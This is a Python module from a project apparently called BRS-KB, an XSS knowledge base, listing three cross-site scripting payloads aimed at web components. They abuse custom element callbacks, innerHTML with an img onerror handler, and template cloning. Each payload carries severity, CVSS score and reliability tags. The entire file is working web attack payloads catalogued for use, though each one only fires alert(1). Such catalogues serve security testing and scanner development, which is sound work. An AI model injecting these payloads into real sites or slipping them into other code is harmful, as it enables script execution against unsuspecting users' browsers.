#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Web Components XSS Payloads
"""

from ..models import PayloadEntry


WEB_COMPONENT_PAYLOADS = {
    "wc_1": PayloadEntry(
        payload="<script>customElements.define('x-xss',class extends HTMLElement{connectedCallback(){alert(1)}})</script><x-xss></x-xss>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Custom element with XSS in connectedCallback",
        tags=["web-components", "custom-elements", "connectedCallback"],
        reliability="high",
    ),
    "wc_2": PayloadEntry(
        payload="<script>customElements.define('x-xss',class extends HTMLElement{constructor(){super();this.innerHTML='<img src=x onerror=alert(1)>'}})</script><x-xss></x-xss>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Custom element with innerHTML XSS",
        tags=["web-components", "custom-elements", "innerHTML"],
        reliability="high",
    ),
    "wc_3": PayloadEntry(
        payload="<template id=t><img src=x onerror=alert(1)></template><script>document.body.appendChild(document.getElementById('t').content.cloneNode(true))</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Template content injection",
        tags=["web-components", "template", "clone"],
        reliability="high",
    ),
}

WEB_COMPONENT_PAYLOADS_TOTAL = len(WEB_COMPONENT_PAYLOADS)
